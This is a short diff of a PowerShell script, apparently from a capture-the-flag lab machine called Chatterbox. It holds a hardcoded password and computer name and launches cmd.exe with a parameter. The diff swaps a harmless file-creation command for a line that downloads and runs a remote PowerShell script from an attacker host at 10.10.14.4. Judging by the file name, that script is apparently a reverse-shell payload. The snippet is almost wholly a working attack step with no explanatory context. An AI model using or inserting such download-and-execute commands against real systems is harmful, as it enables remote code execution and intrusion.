@@ -16,7 +16,7 @@ $password="p@ssw3rd135246"
 $computer = "desktop-960p1c7"
 
 $cmd="`"C:\Windows\System32\cmd.exe`""
-$parameter="`"/C type nul > C:\\tmp\\a.txt`""
+$parameter="`"/C powershell iex(New-Object Net.webClient).downloadstring('http://10.10.14.4/chatterbox/pcat.9003.ps1')`""
 #$parameter="<argument>"
 # }}}
 
